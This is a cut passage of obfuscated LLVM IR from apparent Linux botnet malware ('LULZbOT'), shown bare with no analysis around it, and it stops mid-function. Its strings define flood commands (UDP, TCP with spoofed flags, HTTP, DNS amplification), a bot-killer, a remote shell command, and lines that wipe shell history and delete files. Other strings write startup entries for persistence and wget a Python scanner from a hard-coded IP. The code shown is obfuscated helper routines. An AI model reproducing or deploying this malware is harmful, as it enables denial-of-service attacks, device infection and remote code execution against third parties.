@.str.403 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.404 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.405 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.406 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.407 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.408 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.409 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.410 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.411 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.412 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.415, i32 0, i32 0)], align 16
@.str.416 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\0D\0A\00", align 1
@.str.413 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.414 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.415 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.417 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.418 = private unnamed_addr constant [10 x i8] c"./DNS.txt\00", align 1
@.str.419 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.420 = private unnamed_addr constant [12 x i8] c"irctc.co.in\00", align 1
@.str.421 = private unnamed_addr constant [10 x i8] c"pkill -9 \00", align 1
@.str.422 = private unnamed_addr constant [20 x i8] c"||busybox pkill -9 \00", align 1
@.str.423 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.424 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@.str.425 = private unnamed_addr constant [21 x i8] c"cd /var/tmp; rm -f *\00", align 1
@.str.426 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.427 = private unnamed_addr constant [8 x i8] c"http://\00", align 1
@.str.428 = private unnamed_addr constant [132 x i8] c"GET /%s HTTP/1.1\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: */*\0D\0AConnection: Keep-Alive\0D\0A\0D\0A\00", align 1
@.str.429 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.430 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"PYTHON\00", align 1
@.str.432 = private unnamed_addr constant [8 x i8] c"INSTALL\00", align 1
@.str.433 = private unnamed_addr constant [139 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget http://199.38.245.222/good2.py\00", align 1
@.str.434 = private unnamed_addr constant [26 x i8] c"INSTALLING PYTHON SCANNER\00", align 1
@.str.435 = private unnamed_addr constant [5 x i8] c"bins\00", align 1
@.str.436 = private unnamed_addr constant [56 x i8] c"cd /.tmp;rm -rf *py;wget http://199.38.245.222/good2.py\00", align 1
@.str.437 = private unnamed_addr constant [24 x i8] c"UPDATING PYTHON SCANNER\00", align 1
@.str.438 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.439 = private unnamed_addr constant [31 x i8] c"killall -9 python;pkill python\00", align 1
@.str.440 = private unnamed_addr constant [24 x i8] c"STOPPING PYTHON SCANNER\00", align 1
@.str.441 = private unnamed_addr constant [6 x i8] c"START\00", align 1
@.str.442 = private unnamed_addr constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00", align 1
@.str.443 = private unnamed_addr constant [25 x i8] c"STARTING LE HACKA SCANNA\00", align 1
@.str.444 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.445 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.446 = private unnamed_addr constant [23 x i8] c"bins TAKEN SUCCESFULLY\00", align 1
@.str.447 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.448 = private unnamed_addr constant [17 x i8] c"STOPPING SCANNER\00", align 1
@.str.449 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.450 = private unnamed_addr constant [26 x i8] c"STARTING SCANNER ON -> %s\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"BOTKILL\00", align 1
@.str.452 = private unnamed_addr constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00", align 1
@.str.453 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.454 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.455 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.456 = private unnamed_addr constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00", align 1
@.str.457 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.458 = private unnamed_addr constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00", align 1
@.str.459 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.460 = private unnamed_addr constant [50 x i8] c"HTTP <method> <host> <port> <path> <time> <power>\00", align 1
@.str.461 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.462 = private unnamed_addr constant [91 x i8] c"DNS <target IP> <port> <reflection file url> <forks> <pps limiter, -1 for no limit> <time>\00", align 1
@.str.463 = private unnamed_addr constant [58 x i8] c"DNS amplification flooding %s:%s for %d seconds at %d pps\00", align 1
@.str.464 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.465 = private unnamed_addr constant [28 x i8] c"HOLD <target> <port> <time>\00", align 1
@.str.466 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.467 = private unnamed_addr constant [24 x i8] c"JUNK <ip> <port> <time>\00", align 1
@.str.468 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.469 = private unnamed_addr constant [27 x i8] c"STD <target> <port> <time>\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.471 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.472 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.473 = private unnamed_addr constant [22 x i8] c"KILLMYEYEPEEUSINGHOIC\00", align 1
@.str.474 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.475 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.476 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.477 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.478 = private unnamed_addr constant [9 x i8] c"LULZbOT\0A\00", align 1
@.str.479 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.480 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.481 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.482 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.483 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.484 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.485 = private unnamed_addr constant [12 x i8] c"BUILD %s:%s\00", align 1
@.str.486 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.487 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.488 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.489 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.490 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.491 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 %5, 1808566100
  %7 = add i32 %6, -1640531527
  %8 = add i32 %7, 1808566100
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = add i32 %10, 176745658
  %12 = add i32 %11, -1640531527
  %13 = sub i32 %12, 176745658
  %14 = add i32 %10, -1640531527
  %15 = add i32 %13, -929829650
  %16 = add i32 %15, -1640531527
  %17 = sub i32 %16, -929829650
  %18 = add i32 %13, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %19

; <label>:19:                                     ; preds = %71, %1
  %20 = load i32, i32* %3, align 4
  %21 = icmp slt i32 %20, 4096
  br i1 %21, label %22, label %77

; <label>:22:                                     ; preds = %19
  %23 = load i32, i32* %3, align 4
  %24 = add i32 %23, 217739705
  %25 = sub i32 %24, 3
  %26 = sub i32 %25, 217739705
  %27 = sub nsw i32 %23, 3
  %28 = sext i32 %26 to i64
  %29 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %28
  %30 = load i32, i32* %29, align 4
  %31 = load i32, i32* %3, align 4
  %32 = sub i32 %31, 324247530
  %33 = sub i32 %32, 2
  %34 = add i32 %33, 324247530
  %35 = sub nsw i32 %31, 2
  %36 = sext i32 %34 to i64
  %37 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = xor i32 %30, -1
  %40 = and i32 1243266215, %39
  %41 = xor i32 1243266215, -1
  %42 = and i32 %30, %41
  %43 = xor i32 %38, -1
  %44 = and i32 %43, 1243266215
  %45 = and i32 %38, %41
  %46 = or i32 %40, %42
  %47 = or i32 %44, %45
  %48 = xor i32 %46, %47
  %49 = xor i32 %30, %38
  %50 = xor i32 %48, -1
  %51 = and i32 937469315, %50
  %52 = xor i32 937469315, -1
  %53 = and i32 %48, %52
  %54 = xor i32 -1640531527, -1
  %55 = and i32 %54, 937469315
  %56 = and i32 -1640531527, %52
  %57 = or i32 %51, %53
  %58 = or i32 %55, %56
  %59 = xor i32 %57, %58
  %60 = xor i32 %48, -1640531527
  %61 = load i32, i32* %3, align 4
  %62 = xor i32 %59, -1
  %63 = and i32 %61, %62
  %64 = xor i32 %61, -1
  %65 = and i32 %59, %64
  %66 = or i32 %63, %65
  %67 = xor i32 %59, %61
  %68 = load i32, i32* %3, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %69
  store i32 %66, i32* %70, align 4
  br label %71

; <label>:71:                                     ; preds = %22
  %72 = load i32, i32* %3, align 4
  %73 = add i32 %72, 742228254
  %74 = add i32 %73, 1
  %75 = sub i32 %74, 742228254
  %76 = add nsw i32 %72, 1
  store i32 %75, i32* %3, align 4
  br label %19

; <label>:77:                                     ; preds = %19
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 0, %5
  %7 = sub i32 0, 1
  %8 = add i32 %6, %7
  %9 = sub i32 0, %8
  %10 = add i32 %5, 1
  %11 = xor i32 4095, -1
  %12 = xor i32 %9, %11
  %13 = and i32 %12, %9
  %14 = and i32 %9, 4095
  store i32 %13, i32* @rand_cmwc.i, align 4
  %15 = load i64, i64* %2, align 8
  %16 = load i32, i32* @rand_cmwc.i, align 4
  %17 = zext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = zext i32 %19 to i64
  %21 = mul i64 %15, %20
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = sub i64 0, %23
  %25 = sub i64 %21, %24
  %26 = add i64 %21, %23
  store i64 %25, i64* %1, align 8
  %27 = load i64, i64* %1, align 8
  %28 = lshr i64 %27, 32
  %29 = trunc i64 %28 to i32
  store i32 %29, i32* @c, align 4
  %30 = load i64, i64* %1, align 8
  %31 = load i32, i32* @c, align 4
  %32 = zext i32 %31 to i64
  %33 = sub i64 %30, -8641512296279307390
  %34 = add i64 %33, %32
  %35 = add i64 %34, -8641512296279307390
  %36 = add i64 %30, %32
  %37 = trunc i64 %35 to i32
  store i32 %37, i32* %3, align 4
  %38 = load i32, i32* %3, align 4
  %39 = load i32, i32* @c, align 4
  %40 = icmp ult i32 %38, %39
  br i1 %40, label %41, label %52

; <label>:41:                                     ; preds = %0
  %42 = load i32, i32* %3, align 4
  %43 = sub i32 0, 1
  %44 = sub i32 %42, %43
  %45 = add i32 %42, 1
  store i32 %44, i32* %3, align 4
  %46 = load i32, i32* @c, align 4
  %47 = sub i32 0, %46
  %48 = sub i32 0, 1
  %49 = add i32 %47, %48
  %50 = sub i32 0, %49
  %51 = add i32 %46, 1
  store i32 %50, i32* @c, align 4
  br label %52

; <label>:52:                                     ; preds = %41, %0
  %53 = load i32, i32* %4, align 4
  %54 = load i32, i32* %3, align 4
  %55 = sub i32 %53, -710725455
  %56 = sub i32 %55, %54
  %57 = add i32 %56, -710725455
  %58 = sub i32 %53, %54
  %59 = load i32, i32* @rand_cmwc.i, align 4
  %60 = zext i32 %59 to i64
  %61 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %60
  store i32 %57, i32* %61, align 4
  ret i32 %57
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 0, 1
  %9 = add i64 %7, %8
  %10 = sub i64 %7, 1
  %11 = trunc i64 %9 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %33, %1
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %5, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i64
  %19 = inttoptr i64 %18 to i8*
  %20 = call i32 @strcmp(i8* %19, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #10
  %21 = icmp ne i32 %20, 0
  %22 = xor i1 %21, true
  %23 = and i1 false, %22
  %24 = xor i1 false, true
  %25 = and i1 %21, %24
  %26 = xor i1 true, true
  %27 = and i1 %26, false
  %28 = and i1 true, %24
  %29 = or i1 %23, %25
  %30 = or i1 %27, %28
  %31 = xor i1 %29, %30
  %32 = xor i1 %21, true
  br i1 %31, label %33, label %38

; <label>:33:                                     ; preds = %12
  %34 = load i32, i32* %4, align 4
  %35 = sub i32 0, 1
  %36 = sub i32 %34, %35
  %37 = add nsw i32 %34, 1
  store i32 %36, i32* %4, align 4
  br label %12

; <label>:38:                                     ; preds = %12
  br label %39

; <label>:39:                                     ; preds = %61, %38
  %40 = load i32, i32* %5, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp sge i32 %40, %41
  br i1 %42, label %43, label %59

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %2, align 8
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i64
  %50 = inttoptr i64 %49 to i8*
  %51 = call i32 @strcmp(i8* %50, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #10
  %52 = icmp ne i32 %51, 0
  %53 = xor i1 %52, true
  %54 = and i1 true, %53
  %55 = xor i1 true, true
  %56 = and i1 %52, %55
  %57 = or i1 %54, %56
  %58 = xor i1 %52, true
  br label %59

; <label>:59:                                     ; preds = %43, %39
  %60 = phi i1 [ false, %39 ], [ %57, %43 ]
  br i1 %60, label %61, label %68

; <label>:61:                                     ; preds = %59
  %62 = load i32, i32* %5, align 4
  %63 = sub i32 0, %62
  %64 = sub i32 0, -1
  %65 = add i32 %63, %64
  %66 = sub i32 0, %65
  %67 = add nsw i32 %62, -1
  store i32 %66, i32* %5, align 4
  br label %39

; <label>:68:                                     ; preds = %59
  %69 = load i32, i32* %4, align 4
  store i32 %69, i32* %3, align 4
  br label %70

; <label>:70:                                     ; preds = %89, %68
  %71 = load i32, i32* %3, align 4
  %72 = load i32, i32* %5, align 4
  %73 = icmp sle i32 %71, %72
  br i1 %73, label %74, label %94

; <label>:74:                                     ; preds = %70
  %75 = load i8*, i8** %2, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = load i8*, i8** %2, align 8
  %81 = load i32, i32* %3, align 4
  %82 = load i32, i32* %4, align 4
  %83 = sub i32 %81, -881614096
  %84 = sub i32 %83, %82
  %85 = add i32 %84, -881614096
  %86 = sub nsw i32 %81, %82
  %87 = sext i32 %85 to i64
  %88 = getelementptr inbounds i8, i8* %80, i64 %87
  store i8 %79, i8* %88, align 1
  br label %89

; <label>:89:                                     ; preds = %74
  %90 = load i32, i32* %3, align 4
  %91 = sub i32 0, 1
  %92 = sub i32 %90, %91
  %93 = add nsw i32 %90, 1
  store i32 %92, i32* %3, align 4
  br label %70

; <label>:94:                                     ; preds = %70
  %95 = load i8*, i8** %2, align 8
  %96 = load i32, i32* %3, align 4
  %97 = load i32, i32* %4, align 4
  %98 = add i32 %96, -1395952044
  %99 = sub i32 %98, %97
  %100 = sub i32 %99, -1395952044
  %101 = sub nsw i32 %96, %97
  %102 = sext i32 %100 to i64
  %103 = getelementptr inbounds i8, i8* %95, i64 %102
  store i8 0, i8* %103, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %332, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %335

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %320

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %335

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %321

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %86, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %89

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = sub i32 %76, -218244419
  %78 = sub i32 %77, 48
  %79 = add i32 %78, -218244419
  %80 = sub nsw i32 %76, 48
  %81 = load i32, i32* %7, align 4
  %82 = add i32 %81, 528762196
  %83 = add i32 %82, %79
  %84 = sub i32 %83, 528762196
  %85 = add nsw i32 %81, %79
  store i32 %84, i32* %7, align 4
  br label %86

; <label>:86:                                     ; preds = %71
  %87 = load i8*, i8** %5, align 8
  %88 = getelementptr inbounds i8, i8* %87, i32 1
  store i8* %88, i8** %5, align 8
  br label %59

; <label>:89:                                     ; preds = %69
  %90 = load i8*, i8** %5, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 115
  br i1 %93, label %94, label %134

; <label>:94:                                     ; preds = %89
  %95 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %96 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %95, i32 0, i32 0
  %97 = load i32, i32* %96, align 8
  %98 = icmp ule i32 %97, 40
  br i1 %98, label %99, label %108

; <label>:99:                                     ; preds = %94
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %95, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %102 = getelementptr i8, i8* %101, i32 %97
  %103 = bitcast i8* %102 to i32*
  %104 = add i32 %97, 365928359
  %105 = add i32 %104, 8
  %106 = sub i32 %105, 365928359
  %107 = add i32 %97, 8
  store i32 %106, i32* %96, align 8
  br label %113

; <label>:108:                                    ; preds = %94
  %109 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %95, i32 0, i32 2
  %110 = load i8*, i8** %109, align 8
  %111 = bitcast i8* %110 to i32*
  %112 = getelementptr i8, i8* %110, i32 8
  store i8* %112, i8** %109, align 8
  br label %113

; <label>:113:                                    ; preds = %108, %99
  %114 = phi i32* [ %103, %99 ], [ %111, %108 ]
  %115 = load i32, i32* %114, align 4
  %116 = sext i32 %115 to i64
  %117 = inttoptr i64 %116 to i8*
  store i8* %117, i8** %11, align 8
  %118 = load i8**, i8*** %4, align 8
  %119 = load i8*, i8** %11, align 8
  %120 = icmp ne i8* %119, null
  br i1 %120, label %121, label %123

; <label>:121:                                    ; preds = %113
  %122 = load i8*, i8** %11, align 8
  br label %124

; <label>:123:                                    ; preds = %113
  br label %124

; <label>:124:                                    ; preds = %123, %121
  %125 = phi i8* [ %122, %121 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.492, i32 0, i32 0), %123 ]
  %126 = load i32, i32* %7, align 4
  %127 = load i32, i32* %8, align 4
  %128 = call i32 @prints(i8** %118, i8* %125, i32 %126, i32 %127)
  %129 = load i32, i32* %9, align 4
  %130 = sub i32 %129, 17077931
  %131 = add i32 %130, %128
  %132 = add i32 %131, 17077931
  %133 = add nsw i32 %129, %128
  store i32 %132, i32* %9, align 4
  br label %332

; <label>:134:                                    ; preds = %89
  %135 = load i8*, i8** %5, align 8
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 100
  br i1 %138, label %139, label %170

; <label>:139:                                    ; preds = %134
  %140 = load i8**, i8*** %4, align 8
  %141 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %142 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 0
  %143 = load i32, i32* %142, align 8
  %144 = icmp ule i32 %143, 40
  br i1 %144, label %145, label %155

; <label>:145:                                    ; preds = %139
  %146 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 3
  %147 = load i8*, i8** %146, align 8
  %148 = getelementptr i8, i8* %147, i32 %143
  %149 = bitcast i8* %148 to i32*
  %150 = sub i32 0, %143
  %151 = sub i32 0, 8
  %152 = add i32 %150, %151
  %153 = sub i32 0, %152
  %154 = add i32 %143, 8
  store i32 %153, i32* %142, align 8
  br label %160

; <label>:155:                                    ; preds = %139
  %156 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 2
  %157 = load i8*, i8** %156, align 8
  %158 = bitcast i8* %157 to i32*
  %159 = getelementptr i8, i8* %157, i32 8
  store i8* %159, i8** %156, align 8
  br label %160

; <label>:160:                                    ; preds = %155, %145
  %161 = phi i32* [ %149, %145 ], [ %158, %155 ]
  %162 = load i32, i32* %161, align 4
  %163 = load i32, i32* %7, align 4
  %164 = load i32, i32* %8, align 4
  %165 = call i32 @printi(i8** %140, i32 %162, i32 10, i32 1, i32 %163, i32 %164, i32 97)
  %166 = load i32, i32* %9, align 4
  %167 = sub i32 0, %165
  %168 = sub i32 %166, %167
  %169 = add nsw i32 %166, %165
  store i32 %168, i32* %9, align 4
  br label %332

; <label>:170:                                    ; preds = %134
  %171 = load i8*, i8** %5, align 8
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 120
  br i1 %174, label %175, label %205

; <label>:175:                                    ; preds = %170
  %176 = load i8**, i8*** %4, align 8
  %177 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 8
  %180 = icmp ule i32 %179, 40
  br i1 %180, label %181, label %190

; <label>:181:                                    ; preds = %175
  %182 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %177, i32 0, i32 3
  %183 = load i8*, i8** %182, align 8
  %184 = getelementptr i8, i8* %183, i32 %179
  %185 = bitcast i8* %184 to i32*
  %186 = add i32 %179, -1721317269
  %187 = add i32 %186, 8
  %188 = sub i32 %187, -1721317269
  %189 = add i32 %179, 8
  store i32 %188, i32* %178, align 8
  br label %195

; <label>:190:                                    ; preds = %175
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %177, i32 0, i32 2
  %192 = load i8*, i8** %191, align 8
  %193 = bitcast i8* %192 to i32*
  %194 = getelementptr i8, i8* %192, i32 8
  store i8* %194, i8** %191, align 8
  br label %195

; <label>:195:                                    ; preds = %190, %181
  %196 = phi i32* [ %185, %181 ], [ %193, %190 ]
  %197 = load i32, i32* %196, align 4
  %198 = load i32, i32* %7, align 4
  %199 = load i32, i32* %8, align 4
